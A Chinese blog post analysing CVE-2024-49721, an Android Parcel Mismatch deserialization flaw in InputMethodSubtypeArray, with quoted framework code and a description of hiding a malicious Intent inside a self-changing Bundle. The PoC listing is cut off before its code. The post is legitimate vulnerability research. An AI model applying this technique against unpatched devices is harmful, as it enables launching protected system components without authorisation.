<!DOCTYPE html><html><head hexo-theme="https://volantis.js.org/#2.5.1"><meta charset="utf-8"><meta name="renderer" content="webkit"><meta name="force-rendering" content="webkit"><meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"><meta name="HandheldFriendly" content="True"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><title>CVE-2024-49721 InputMethodSubtypeArray 反序列化漏洞分析 - 残页的小博客</title><meta name="keywords" content="android,system,安全,parcel"><meta name="description" content="神马，都 2025 年啦，还有 Parcel Mismatch 漏洞？！？对！你没听错！最经典最被广泛利用的 Parcel Mismatch 漏洞，它又双叒叕来了！怕了吗？！？去年我和 Cxxsheng 对整个 Parcelable IPC 机制进行了一些研究，并开发了一个扫描器用以扫描相关漏洞。此漏洞就是我们研..."><link rel="alternate" href="/atom.xml" title="残页的小博客"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css"><link rel="shortcut icon" type="image/x-icon" href="/data/image/favicon.ico"><link rel="stylesheet" href="/css/style.css"><script>function setLoadingBarProgress(e){document.getElementById("loading-bar").style.width=e+"%"}</script><script type="text/javascript" src="/sw-register.js"></script></head><body><div id="loading-bar-wrapper"><div id="loading-bar"></div></div><header class="l_header shadow blur"><div class="container"><div class="wrapper"><div class="nav-sub"><p class="title"></p><ul class="switcher nav-list-h"><li><a class="s-comment fas fa-comments fa-fw" target="_self" href="javascript:void(0)"></a></li><li><a class="s-toc fas fa-list fa-fw" target="_self" href="javascript:void(0)"></a></li></ul></div><div class="nav-main"><a class="title flat-box" target="_self" href="/">残页的小博客</a><div class="menu navigation"><ul class="nav-list-h"><li><a class="flat-box" href="/" id="home"><i class="fas fa-rss fa-fw"></i>博客</a></li><li><a class="flat-box" href="/tags/" id="tags"><i class="fas fa-tags fa-fw"></i>标签</a></li><li><a class="flat-box" href="/archives/" id="archives"><i class="fas fa-archive fa-fw"></i>归档</a></li><li><a class="flat-box" href="/friends/" id="friends"><i class="fas fa-link fa-fw"></i>友链</a></li><li><a class="flat-box" href="/about/" id="about"><i class="fas fa-info-circle fa-fw"></i>关于</a></li></ul></div><div class="m_search"><form name="searchform" class="form u-search-form"><i class="icon fas fa-search fa-fw"></i> <input type="text" class="input u-search-input" placeholder="搜索……"></form></div><ul class="switcher nav-list-h"><li><a class="s-search fas fa-search fa-fw" target="_self" href="javascript:void(0)"></a></li><li><a class="s-menu fas fa-bars fa-fw" target="_self" href="javascript:void(0)"></a><ul class="menu-phone list-v navigation white-box"><li><a class="flat-box" href="/" id="home"><i class="fas fa-rss fa-fw"></i>博客</a></li><li><a class="flat-box" href="/tags/" id="tags"><i class="fas fa-tags fa-fw"></i>标签</a></li><li><a class="flat-box" href="/archives/" id="archives"><i class="fas fa-archive fa-fw"></i>归档</a></li><li><a class="flat-box" href="/friends/" id="friends"><i class="fas fa-link fa-fw"></i>友链</a></li><li><a class="flat-box" href="/about/" id="about"><i class="fas fa-info-circle fa-fw"></i>关于</a></li></ul></li></ul></div></div></div></header><script>setLoadingBarProgress(40)</script><div class="l_body nocover"><div class="body-wrapper"><div class="l_main"><article id="post" class="post white-box shadow blur article-type-post" itemscope itemprop="blogPost"><section class="meta"><div class="meta" id="header-meta"><h1 class="title"><a href="/2025/02/04/CVE-2024-49721/">CVE-2024-49721 InputMethodSubtypeArray 反序列化漏洞分析</a></h1><div class="new-meta-box"><div class="new-meta-item author"><a href="https://blog.canyie.top/" rel="nofollow"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="/data/image/avatar_new.jpg"><p>canyie</p></a></div><div class="new-meta-item date"><a class="notlink"><i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i><p>发布于2025年2月4日</p></a></div><div class="new-meta-item wordcount"><a class="notlink"><i class="fas fa-keyboard fa-fw" aria-hidden="true"></i><p>字数：3.8k字</p></a></div><div class="new-meta-item readtime"><a class="notlink"><i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i><p>时长：16分钟</p></a></div><div class="new-meta-item browse busuanzi"><a class="notlink"><i class="fas fa-eye fa-fw" aria-hidden="true"></i><p><span id="busuanzi_value_page_pv"><i class="fas fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></p></a></div></div><hr></div></section><section class="article typo"><div class="article-entry" itemprop="articleBody"><p>神马，都 2025 年啦，还有 Parcel Mismatch 漏洞？！？对！你没听错！最经典最被广泛利用的 Parcel Mismatch 漏洞，它又双叒叕来了！怕了吗？！？<br>去年我和 <a href="https://github.com/cxxsheng" target="_blank" rel="noopener">Cxxsheng</a> 对整个 Parcelable IPC 机制进行了一些研究，并开发了一个扫描器用以扫描相关漏洞。此漏洞就是我们研究过程中发现的漏洞之一。我们于 2024 年 12 月 3 日提交漏洞报告，后被告知与另一份漏洞报告重复。以下记录了我们当时的分析。部分敏感信息已被移除或脱敏以保证安全。</p><a id="more"></a><p>本文包含了一个简单的 PoC。由于大部分用户都已经升级到有 <code>checkKeyIntentParceledCorrectly</code> 额外补丁的版本，参照以前类似漏洞的利用方法直接把本文里的 PoC 代码拿去攻击无法成功，故我们认为大部分用户已经得到保护，披露相关细节是安全的。</p><p>我们在此次研究中产出的其他文章（持续更新）：</p><ul><li>万众瞩目却又被大家忽略的历史漏洞：<a href="https://github.com/cxxsheng/CVE-2022-20474" target="_blank" rel="noopener">CVE-2022-20474分析——LazyValue下的Self-changed Bundle by Cxxsheng</a></li></ul><h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><p>检出 android-12.0.0_r1 分支的源码，查看 <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r1:frameworks/base/core/java/android/view/inputmethod/InputMethodSubtypeArray.java" target="_blank" rel="noopener">InputMethodSubtypeArray.java</a> 这个文件（点击可直接跳转），关注它的序列化和反序列化过程。<br>反序列化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Unmarshall an instance of &#123;<span class="doctag">@link</span> InputMethodSubtypeArray&#125; from a given &#123;<span class="doctag">@link</span> Parcel&#125;</span></span><br><span class="line"><span class="comment"> * object.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> source A &#123;<span class="doctag">@link</span> Parcel&#125; object from which &#123;<span class="doctag">@link</span> InputMethodSubtypeArray&#125; will be</span></span><br><span class="line"><span class="comment"> * unmarshalled.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InputMethodSubtypeArray</span><span class="params">(<span class="keyword">final</span> Parcel source)</span> </span>&#123;</span><br><span class="line">    mCount = source.readInt();</span><br><span class="line">    <span class="keyword">if</span> (mCount &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        mDecompressedSize = source.readInt();</span><br><span class="line">        mCompressedData = source.createByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>序列化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Marshall the instance into a given &#123;<span class="doctag">@link</span> Parcel&#125; object.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;This methods may take a bit additional time to compress data lazily when called</span></span><br><span class="line"><span class="comment"> * first time.&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> source A &#123;<span class="doctag">@link</span> Parcel&#125; object to which &#123;<span class="doctag">@link</span> InputMethodSubtypeArray&#125; will be</span></span><br><span class="line"><span class="comment"> * marshalled.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeToParcel</span><span class="params">(<span class="keyword">final</span> Parcel dest)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (mCount == <span class="number">0</span>) &#123;</span><br><span class="line">        dest.writeInt(mCount);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span>[] compressedData = mCompressedData;</span><br><span class="line">    <span class="keyword">int</span> decompressedSize = mDecompressedSize;</span><br><span class="line">    <span class="keyword">if</span> (compressedData == <span class="keyword">null</span> &amp;&amp; decompressedSize == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (mLockObject) &#123;</span><br><span class="line">            compressedData = mCompressedData;</span><br><span class="line">            decompressedSize = mDecompressedSize;</span><br><span class="line">            <span class="keyword">if</span> (compressedData == <span class="keyword">null</span> &amp;&amp; decompressedSize == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="keyword">byte</span>[] decompressedData = marshall(mInstance);</span><br><span class="line">                compressedData = compress(decompressedData);</span><br><span class="line">                <span class="keyword">if</span> (compressedData == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    decompressedSize = -<span class="number">1</span>;</span><br><span class="line">                    Slog.i(TAG, <span class="string">"Failed to compress data."</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    decompressedSize = decompressedData.length;</span><br><span class="line">                &#125;</span><br><span class="line">                mDecompressedSize = decompressedSize;</span><br><span class="line">                mCompressedData = compressedData;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (compressedData != <span class="keyword">null</span> &amp;&amp; decompressedSize &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        dest.writeInt(mCount);</span><br><span class="line">        dest.writeInt(decompressedSize);</span><br><span class="line">        dest.writeByteArray(compressedData);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Slog.i(TAG, <span class="string">"Unexpected state. Behaving as an empty array."</span>);</span><br><span class="line">        dest.writeInt(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显能看出来两边逻辑不一致。反序列化的时候首先会读一个 int 作为 count，count 大于 0 的时候才会读 decompressed size（int）和 compressed data （byte[]）。而序列化的时候，<code>count == 0</code> 的时候确实只会写一个 int 0 进去，如果 count 不为 0，底下有两个分支，一个分支会写 count（int）、decompressed size（int）和 compressed data（byte[]），另一个分支只会写 int 0 作为 count。<br>所以问题就在于这个 count。简单枚举一下所有情况：<code>count &gt; 0</code> 的时候，一边写 int、int、byte[] 进去，另一边读 int、int、byte[] 出来，没问题；<code>count == 0</code> 的时候，一边只会写 int 0 进去，另一边读 int 出来，也没问题。而如果 <code>count &lt; 0</code>，就有可能发生一边写了 int、int、byte[] 进去，而另一边只读了一个 int 出来的情况，造成数据残留，也即所谓的 parcel mismatch 问题。</p><p>那么问题就转换成，在攻击者指定负数 count 的情况下，是否存在能让 <code>compressedData != null &amp;&amp; decompressedSize &gt; 0</code> 的情况，从而多写内容进 parcel？<br>注意到这个 if 上面还有个 if，当 <code>compressedData == null &amp;&amp; decompressedSize == 0</code> 时，会调用 marshall 和 compress 对两个字段进行重新赋值。这就是 <code>count &lt; 0</code> 的时候会发生的情况，看一下这两个函数的实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] marshall(<span class="keyword">final</span> InputMethodSubtype[] array) &#123;</span><br><span class="line">    Parcel parcel = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        parcel = Parcel.obtain();</span><br><span class="line">        parcel.writeTypedArray(array, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> parcel.marshall();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (parcel != <span class="keyword">null</span>) &#123;</span><br><span class="line">            parcel.recycle();</span><br><span class="line">            parcel = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] compress(<span class="keyword">final</span> <span class="keyword">byte</span>[] data) &#123;</span><br><span class="line">    <span class="keyword">try</span> (<span class="keyword">final</span> ByteArrayOutputStream resultStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">final</span> GZIPOutputStream zipper = <span class="keyword">new</span> GZIPOutputStream(resultStream)) &#123;</span><br><span class="line">        zipper.write(data);</span><br><span class="line">        zipper.finish();</span><br><span class="line">        <span class="keyword">return</span> resultStream.toByteArray();</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">        Slog.e(TAG, <span class="string">"Failed to compress the data."</span>, e);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们的例子里要压缩的数据 <code>mInstance</code> 是 null，在 <code>writeTypedArray</code> 里会写一个 -1 进去作为长度，返回一个有数据的 byte[]，然后进入 <code>compress</code> 里进行 gzip 压缩，最后生成有内容的 byte[]，刚好满足下面的条件，触发漏洞。</p><p>需要注意的是，这个漏洞在 Android 14 中已经被修复，补丁： <a href="https://github.com/aosp-mirror/platform_frameworks_base/commit/bc2fbfc0b73535ce9d0c9f73b5130cfffaf4daee" target="_blank" rel="noopener">https://github.com/aosp-mirror/platform_frameworks_base/commit/bc2fbfc0b73535ce9d0c9f73b5130cfffaf4daee</a><br>然而这个补丁在很长的一段时间内并没有被当成安全补丁反向移植到旧版本。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>此漏洞属于我们所谓的 Parcel Mismatch 漏洞，这是一类最早可追溯至 2014 年的漏洞，最早由 <a href="https://github.com/michalbednarski" target="_blank" rel="noopener">Michal Bednarski</a> 报告。对于此类漏洞应该如何利用，需要一些前置知识。这里不赘述，给出一些相关文章供大家参考：</p><ul><li>经典的入门教程：<a href="https://xz.aliyun.com/news/2046" target="_blank" rel="noopener">Bundle风水——Android序列化与反序列化不匹配漏洞详解 by heeeeen</a>，虽然年代久远但并不影响学习</li><li>比较新的文章，cover 了更多 case：<a href="https://mp.weixin.qq.com/s/62qTWxvRzWpKyZl58nj7Gg" target="_blank" rel="noopener">Parcelable和Bundle的爱恨情仇（一）——读写不匹配 by OPPO安珀实验室</a></li><li>另一篇很好的入门文章，PoC 里详细解释了每一个值的作用及 mismatch 后的新意义：<a href="https://wrlus.com/android-security/bundle-mismatch/" target="_blank" rel="noopener">再谈Parcelable反序列化漏洞和Bundle mismatch by 小路</a></li><li>相关漏洞大总结：<a href="https://evilpan.com/2023/02/18/parcel-bugs/" target="_blank" rel="noopener">Android 反序列化漏洞攻防史话 by 有价值炮灰</a></li><li>一篇主要关注实际各类漏洞如何利用的文章：<a href="https://xuanxuanblingbling.github.io/ctf/android/2024/04/13/launchanywhere02/" target="_blank" rel="noopener">LaunchAnyWhere 补丁绕过：Android Bundle Mismatch 系列漏洞 复现与分析 by Clang裁缝店</a></li></ul><p>读者也可以自行上网搜索，关键词： <code>Android Parcel Mismatch</code>、<code>Bundle Mismatch</code>、<code>Self-changing Bundle</code> 及 <code>EvilParcel bug</code> 等。</p><p>参考以往 parcel mismatch 漏洞的利用，我们这里构造一个 self changing bundle 并把一个恶意的指向系统私有未导出 <code>PlatLogoActivity</code> 的 intent 隐藏进去。构造的恶意 intent：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Intent().setClassName(<span class="string">"android"</span>, <span class="string">"com.android.internal.app.PlatLogoActivity"</span>)</span><br></pre></td></tr></table></figure><p>需要注意的是，Android 13 引入的 Lazy Bundle 增强措施导致我们无法再使用这种 parcel mismatch 构造 self changing bundle，所以需要使用 Android 12 或更旧的版本进行测试。较新的安全补丁里引入了一个额外的安全检查 <code>checkKeyIntentParceledCorrectly</code> 对整个 <code>AccountManagerService</code> 进行了加固，导致我们即使使用 android 12，如果安全补丁比较新，像往常一样直接把恶意 bundle 返回给 <code>AccountManagerService</code> 也无法触发漏洞。这里我们只在代码里模拟一下整个流程。</p><h3 id="InputMethodInfo"><a href="#InputMethodInfo" class="headerlink" title="InputMethodInfo"></a>InputMethodInfo</h3><p>如果你直接按照往常的经验在 parcel 里写入 InputMethodSubtypeArray 的类名，写入恶意数据然后直接使用，恭喜你收到一个 BadParcelableException 作为结果。这是因为，我们可爱的 InputMethodSubtypeArray 这个类，根本就没有实现 Parcelable 这个接口，也就是说它根本不是一个 parcelable。<br>代码里唯一会用到这个类的地方就是 <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r1:frameworks/base/core/java/android/view/inputmethod/InputMethodInfo.java" target="_blank" rel="noopener">InputMethodInfo</a>，这个类可就是根正苗红的 Parcelable 了，它序列化和反序列化的过程都会调用到 InputMethodSubtypeArray：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">InputMethodInfo(Parcel source) &#123;</span><br><span class="line">    mId = source.readString();</span><br><span class="line">    mSettingsActivityName = source.readString();</span><br><span class="line">    mIsDefaultResId = source.readInt();</span><br><span class="line">    mIsAuxIme = source.readInt() == <span class="number">1</span>;</span><br><span class="line">    mSupportsSwitchingToNextInputMethod = source.readInt() == <span class="number">1</span>;</span><br><span class="line">    mInlineSuggestionsEnabled = source.readInt() == <span class="number">1</span>;</span><br><span class="line">    mSuppressesSpellChecker = source.readBoolean();</span><br><span class="line">    mShowInInputMethodPicker = source.readBoolean();</span><br><span class="line">    mIsVrOnly = source.readBoolean();</span><br><span class="line">    mService = ResolveInfo.CREATOR.createFromParcel(source);</span><br><span class="line">    mSubtypes = <span class="keyword">new</span> InputMethodSubtypeArray(source);</span><br><span class="line">    mHandledConfigChanges = source.readInt();</span><br><span class="line">    mForceDefault = <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Used to package this object into a &#123;<span class="doctag">@link</span> Parcel&#125;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> dest The &#123;<span class="doctag">@link</span> Parcel&#125; to be written.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> flags The flags used for parceling.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeToParcel</span><span class="params">(Parcel dest, <span class="keyword">int</span> flags)</span> </span>&#123;</span><br><span class="line">    dest.writeString(mId);</span><br><span class="line">    dest.writeString(mSettingsActivityName);</span><br><span class="line">    dest.writeInt(mIsDefaultResId);</span><br><span class="line">    dest.writeInt(mIsAuxIme ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">    dest.writeInt(mSupportsSwitchingToNextInputMethod ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">    dest.writeInt(mInlineSuggestionsEnabled ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">    dest.writeBoolean(mSuppressesSpellChecker);</span><br><span class="line">    dest.writeBoolean(mShowInInputMethodPicker);</span><br><span class="line">    dest.writeBoolean(mIsVrOnly);</span><br><span class="line">    mService.writeToParcel(dest, flags);</span><br><span class="line">    mSubtypes.writeToParcel(dest);</span><br><span class="line">    dest.writeInt(mHandledConfigChanges);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>mSubtypes</code> 就是 InputMethodSubtypeArray。<br>需要注意的是我们这里用的是 Android 12 的源码，新的版本里往这个类加入了其他字段，会影响我们构造 bundle 的结构，这部分不重要，这里略过不讲。</p><h3 id="多字节？少字节！"><a href="#多字节？少字节！" class="headerlink" title="多字节？少字节！"></a>多字节？少字节！</h3><p>往常的漏洞里，多出的或者少掉的数据一般是攻击者可控的，因为 parcelable 本来就是传输对象内部数据的，从 parcel 读出攻击者指定的恶意数据然后再把它写进 parcel 是非常合理的。像多出 4 个字节的漏洞，一般是指定一个 0 来构造 bundle，让 bundle 读出一个原本不存在的 0 长字符串当成 key 从而影响后续解析。<br>而这个漏洞里多出来的可不止四个字节，而是一个 int 和一个 byte[]，数据稳定但并不受我们控制。经过实验，parcel 内会残留 32 字节数据，多写的 (int) decompressedSize 作为 size 会在 InputMethodInfo 被当成 mHandledConfigChanges 读取，后续 bundle 再读取一个 String16 当成 key，这里实际读取位置已经在 byte[] 里。读 String16 会先读一个 int 作为 length，而写 byte[] 正好也会先写 length 进去，所以 byte[] 的 length 会被当成 String16 的 length。编写测试代码把残留的第一个 int 读出来，结果为 24，而总的残留大小为 32，减去两个 int 的大小，的确就是 24。很合理。<br>然后你会觉得 key 长度刚好等于 byte[] 长度所以刚好会把整个 byte[] 都消耗掉？当然不对，key 作为一个 String16，里面一个字符占两个字节，同时结尾必须是 <code>\0</code> 作为结束符，所以实际消耗的数据会比 byte[] 更多，按照多出字节的思路去构造是不对的，我们应该按照少了字节的思路去补齐这个 key，然后再在后面去填充恶意 payload。<br>一开始由于长度的计算错误，我以为这个长度不够我按以往的“插入一个 VAL_BYTEARRAY ”的方式去隐藏恶意 intent，所以我这里给出的 PoC 是把 intent 隐藏在了下一个 key 里面，以前都没怎么看见过有人藏进 string 里面，算是比较新的思路？后面发现大小应该是够的，懒得再改代码了。不过这种方法有个缺陷，因为 intent 现在是 key 的一部分，修改 intent 会导致 key 的 hash code 改变，而 bundle 的排序是按 hash code 排的，需要对 bundle 里的所有 key 都精心布局避免发生错位。我这里只使用一个固定的 intent 进行演示，因此在代码里直接写死就好。PoC 如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 